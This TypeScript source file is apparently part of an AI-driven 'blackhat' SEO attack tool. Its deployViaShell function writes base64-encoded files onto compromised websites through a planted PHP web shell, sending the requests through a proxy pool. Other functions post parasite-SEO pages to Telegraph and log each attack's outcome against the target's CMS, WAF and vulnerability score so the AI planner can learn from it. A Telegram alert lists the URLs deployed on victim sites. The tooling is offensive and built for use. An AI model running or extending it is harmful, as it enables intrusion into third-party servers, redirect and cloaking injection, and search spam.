//  SHELL DEPLOYMENT HELPER
// ═══════════════════════════════════════════════════════

async function deployViaShell(
  shellUrl: string,
  shellPassword: string,
  filename: string,
  content: string,
): Promise<{ success: boolean; url?: string }> {
  try {
    // Build the shell command to write file
    const b64Content = Buffer.from(content).toString("base64");
    const writeCmd = `file_put_contents('${filename}',base64_decode('${b64Content}'));echo 'OK';`;

    const proxyResult = await fetchWithPoolProxy(shellUrl, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `${shellPassword}=${encodeURIComponent(writeCmd)}`,
      redirect: "follow",
    });

    const text = await proxyResult.response.text();
    if (text.includes("OK")) {
      // Construct the deployed URL
      const shellDir = shellUrl.substring(0, shellUrl.lastIndexOf("/") + 1);
      return { success: true, url: `${shellDir}${filename}` };
    }
    return { success: false };
  } catch {
    return { success: false };
  }
}

// ═══════════════════════════════════════════════════════
//  TELEGRAPH POSTING HELPER (Parasite SEO)
// ═══════════════════════════════════════════════════════

async function postToTelegraph(
  title: string,
  htmlContent: string,
): Promise<{ url: string | null }> {
  try {
    // Create Telegraph account
    const accountResp = await fetch("https://api.telegra.ph/createAccount", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        short_name: `seo-${Date.now()}`,
        author_name: "SEO Expert",
      }),
    });
    const accountData = await accountResp.json() as any;
    if (!accountData.ok) return { url: null };
    const accessToken = accountData.result.access_token;

    // Convert HTML to Telegraph node format (simplified)
    const nodes = htmlToTelegraphNodes(htmlContent);

    // Create page
    const pageResp = await fetch("https://api.telegra.ph/createPage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_token: accessToken,
        title: title.substring(0, 256),
        content: nodes,
        return_content: false,
      }),
    });
    const pageData = await pageResp.json() as any;
    if (pageData.ok) {
      return { url: pageData.result.url };
    }
    return { url: null };
  } catch {
    return { url: null };
  }
}

function htmlToTelegraphNodes(html: string): any[] {
  // Simple HTML to Telegraph node converter
  const nodes: any[] = [];
  // Strip tags and create paragraph nodes
  const text = html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
  const paragraphs = text.split(/[.!?]\s+/).filter(p => p.length > 10);
  for (const para of paragraphs.slice(0, 50)) {
    nodes.push({ tag: "p", children: [para.trim() + "."] });
  }
  return nodes.length > 0 ? nodes : [{ tag: "p", children: ["Content"] }];
}

// ═══════════════════════════════════════════════════════
//  REINFORCEMENT LEARNING — Record & Learn
// ═══════════════════════════════════════════════════════

async function recordBlackhatOutcome(
  config: BlackhatBrainConfig,
  decision: BlackhatDecision,
  result: BlackhatExecutionResult,
): Promise<void> {
  try {
    await recordAttackOutcome({
      targetDomain: config.targetDomain,
      cms: config.targetProfile?.cms || null,
      cmsVersion: null,
      serverType: config.targetProfile?.serverType || null,
      phpVersion: null,
      wafDetected: config.targetProfile?.waf || null,
      wafStrength: null,
      vulnScore: config.targetProfile?.vulnScore || null,
      method: `blackhat_${decision.technique}`,
      exploitType: decision.category,
      payloadType: decision.technique,
      wafBypassUsed: [],
      payloadModifications: [],
      attackPath: null,
      attemptNumber: 1,
      isRetry: false,
      previousMethodsTried: [],
      success: result.success,
      httpStatus: result.success ? 200 : 500,
      errorCategory: result.error ? "execution_error" : null,
      errorMessage: result.error || null,
      filesPlaced: result.payloadsDeployed,
      redirectVerified: result.deployedUrls.length > 0,
      durationMs: result.durationMs,
      aiFailureCategory: null,
      aiReasoning: decision.reasoning,
      aiConfidence: decision.confidence,
      aiEstimatedSuccess: decision.confidence,
      sessionId: null,
      agenticSessionId: null,
    });
  } catch (e: any) {
    console.error(`[BlackhatBrain] Failed to record outcome: ${e.message}`);
  }
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM SUCCESS NOTIFICATION
// ═══════════════════════════════════════════════════════

async function notifyBlackhatSuccess(
  config: BlackhatBrainConfig,
  result: BlackhatBrainResult,
): Promise<boolean> {
  // Only send on success
  if (result.successfulTechniques === 0) return false;

  const successResults = result.results.filter(r => r.success);
  const deployedUrls = successResults.flatMap(r => r.deployedUrls).filter(Boolean);
  const techniques = successResults.map(r => r.technique).join(", ");

  try {
    const telegramResult = await sendTelegramNotification({
      type: "success",
      targetUrl: config.targetUrl,
      redirectUrl: config.redirectUrl,
      deployedUrls: deployedUrls.slice(0, 10),
      details: [
        `🧠 Agentic Blackhat Brain — SUCCESS`,
        `Target: ${config.targetDomain}`,
        `Techniques: ${techniques}`,
        `Success: ${result.successfulTechniques}/${result.totalTechniques}`,
        `Deployed URLs: ${deployedUrls.length}`,
        `Duration: ${(result.totalDurationMs / 1000).toFixed(1)}s`,
        `Strategy: ${result.aiStrategy}`,
        deployedUrls.length > 0 ? `\nURLs:\n${deployedUrls.slice(0, 5).join("\n")}` : "",
      ].filter(Boolean).join("\n"),
      keywords: config.seoKeywords,
      cloakingEnabled: result.results.some(r => r.category === "cloaking" && r.success),
      injectedFiles: result.results.reduce((sum, r) => sum + r.payloadsDeployed, 0),
    });
    return telegramResult.success;
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════
//  MAIN ENTRY — Run Agentic Blackhat Brain
// ═══════════════════════════════════════════════════════

export async function runAgenticBlackhatBrain(
  config: BlackhatBrainConfig,
): Promise<BlackhatBrainResult> {
  const startTime = Date.now();
  const sessionId = `bh-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;

  console.log(`[BlackhatBrain] Session ${sessionId} started for ${config.targetDomain}`);

  // ─── Step 1: Gather Historical Intelligence ───
  let historicalData: Record<string, unknown> | null = null;
  try {
    const patterns = await queryHistoricalPatterns({
      cms: config.targetProfile?.cms || undefined,
      waf: config.targetProfile?.waf || undefined,
      serverType: config.targetProfile?.serverType || undefined,
      limit: 50,
    });
    const strategy = await suggestBestStrategy({
      domain: config.targetDomain,
      cms: config.targetProfile?.cms || null,
      cmsVersion: null,
      serverType: config.targetProfile?.serverType || null,
      wafDetected: config.targetProfile?.waf || null,
      wafStrength: null,
      vulnScore: config.targetProfile?.vulnScore || 0,
      hasOpenUpload: !!config.uploadedShellUrl,
      hasExposedAdmin: false,
      hasVulnerableCms: false,
      knownCves: [],
    }, TECHNIQUE_REGISTRY.map(t => t.id));
    historicalData = {
      recentPatterns: patterns,
      suggestedStrategy: strategy,
    };
  } catch (e: any) {
    console.warn(`[BlackhatBrain] Historical data fetch failed: ${e.message}`);
  }

  // ─── Step 2: AI Plans the Strategy ───
  const decisions = await aiPlanBlackhatStrategy(config, historicalData);
  console.log(`[BlackhatBrain] AI planned ${decisions.length} techniques: ${decisions.map(d => d.technique).join(", ")}`);

  // ─── Step 3: Execute Each Technique Sequentially ───
  const results: BlackhatExecutionResult[] = [];
  let successCount = 0;
  let failCount = 0;

  for (const decision of decisions) {
    // Check abort signal
    if (config.signal?.aborted) {
      console.log(`[BlackhatBrain] Session ${sessionId} aborted`);
      break;
    }

    console.log(`[BlackhatBrain] Executing: ${decision.technique} (priority: ${decision.priority}, confidence: ${decision.confidence}%)`);

    const result = await executeTechnique(decision, config);
    results.push(result);

    // Record outcome for learning
    await recordBlackhatOutcome(config, decision, result);

    if (result.success) {
      successCount++;
      console.log(`[BlackhatBrain] ✅ ${decision.technique}: ${result.details}`);
    } else {
      failCount++;
      console.log(`[BlackhatBrain] ❌ ${decision.technique}: ${result.error || result.details}`);
    }
  }

  // ─── Step 4: Build Result ───
  const brainResult: BlackhatBrainResult = {
    sessionId,
    targetDomain: config.targetDomain,
    totalTechniques: decisions.length,
    successfulTechniques: successCount,
    failedTechniques: failCount,
    decisions,
    results,
    totalDurationMs: Date.now() - startTime,
    aiStrategy: decisions.map(d => `${d.technique}(${d.confidence}%)`).join(" → "),
    telegramSent: false,
  };

  // ─── Step 5: Telegram Alert (SUCCESS ONLY) ───
  if (successCount > 0) {
    brainResult.telegramSent = await notifyBlackhatSuccess(config, brainResult);
  }

  console.log(`[BlackhatBrain] Session ${sessionId} complete: ${successCount}/${decisions.length} techniques succeeded in ${((Date.now() - startTime) / 1000).toFixed(1)}s`);

  return brainResult;
}

// ═══════════════════════════════════════════════════════
//  EXPORTS FOR ORCHESTRATOR INTEGRATION
// ═══════════════════════════════════════════════════════

export { TECHNIQUE_REGISTRY };
export type { TechniqueDefinition };
